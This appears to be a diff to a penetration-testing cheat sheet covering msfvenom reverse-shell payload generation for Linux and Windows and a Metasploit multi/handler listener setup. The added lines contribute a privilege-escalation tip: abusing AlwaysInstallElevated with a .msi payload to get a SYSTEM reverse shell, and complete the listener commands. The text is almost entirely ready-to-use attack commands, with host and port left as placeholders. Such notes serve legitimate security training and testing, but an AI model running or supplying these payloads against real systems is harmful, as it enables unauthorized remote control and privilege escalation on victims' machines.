@@ -21,6 +21,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > <fname>
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > <fname>.exe
 ```
 Note: MSFvenom support creating payload in this way for many extension and stuffs (including .war etc.)
+Note2: One of the easy win in windows with msfvenom is to check if AlwaysInstallElevated = 1, if such is present we can generate a .msi payload and immediately gain a reverse shell in nt authority/system
 
 General:
 
@@ -28,6 +29,8 @@ General:
 ```
 use exploit/multi/handler
 set LHOST <ip>
-set LPORT 
+set LPORT <port>
+exploit
+#Run Session
 ```
 
